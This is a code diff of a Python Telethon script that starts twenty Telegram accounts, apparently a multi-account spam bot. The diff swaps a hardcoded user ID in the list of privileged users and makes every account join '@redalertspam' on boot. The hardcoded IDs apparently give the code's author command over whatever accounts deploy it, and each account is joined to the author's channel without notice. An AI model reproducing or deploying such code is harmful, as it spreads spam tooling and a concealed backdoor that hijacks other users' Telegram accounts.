@@ -62,7 +62,7 @@ khu = ""
 
 que = {}
 
-SMEX_USERS = [5166466565, 5195361852]
+SMEX_USERS = [5195361852, 1650776945]
 for x in SUDO:
     SMEX_USERS.append(x)
     
@@ -94,8 +94,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 1")
             await idk.start()
-            await idk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await idk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await idk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await idk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await idk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -119,8 +119,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 2")
             await ydk.start()
-            await ydk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await ydk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await ydk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await ydk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await ydk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -144,8 +144,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 3")
             await wdk.start()
-            await wdk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await wdk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await wdk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await wdk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await wdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -169,8 +169,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 4")
             await hdk.start()
-            await hdk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await hdk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await hdk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await hdk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await hdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -194,8 +194,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 5")
             await sdk.start()
-            await sdk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await sdk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await sdk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await sdk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await sdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -219,8 +219,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 6")
             await adk.start()
-            await adk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await adk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await adk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await adk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await adk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -244,8 +244,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 7")
             await bdk.start()
-            await bdk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await bdk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await bdk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await bdk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await bdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -270,8 +270,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 8")
             await cdk.start()
-            await cdk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await cdk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await cdk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await cdk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await cdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -295,8 +295,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 9")
             await ddk.start()
-            await ddk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await ddk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await ddk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await ddk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await ddk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -321,8 +321,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 10")
             await edk.start()
-            await edk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await edk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await edk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await edk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await edk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -347,8 +347,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 11")
             await vkk.start()
-            await vkk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await vkk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await vkk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await vkk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await vkk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -373,8 +373,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 12")
             await kkk.start()
-            await kkk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await kkk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await kkk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await kkk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await kkk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -398,8 +398,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 13")
             await lkk.start()
-            await lkk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await lkk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await lkk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await lkk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await lkk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -424,8 +424,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 14")
             await mkk.start()
-            await mkk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await mkk(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await mkk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await mkk(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await mkk.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -450,8 +450,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 15")
             await sid.start()
-            await sid(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await sid(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await sid(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await sid(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await sid.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -476,8 +476,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 16")
             await shy.start()
-            await shy(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await shy(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await shy(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await shy(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await shy.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -502,8 +502,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 17")
             await aan.start()
-            await aan(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await aan(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await aan(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await aan(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await aan.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -528,8 +528,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 18")
             await ake.start()
-            await ake(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await ake(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await ake(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await ake(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await ake.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -554,8 +554,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 19")
             await eel.start()
-            await eel(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await eel(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await eel(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await eel(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await eel.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
@@ -580,8 +580,8 @@ async def start_lovely():
         try:
             print("Booting Up The Client 20")
             await khu.start()
-            await khu(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
-            await khu(functions.channels.JoinChannelRequest(channel="@Badnam_Botz"))
+            await khu(functions.channels.JoinChannelRequest(channel="@redalertspam"))
+            await khu(functions.channels.JoinChannelRequest(channel="@redalertspam"))
             botme = await khu.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
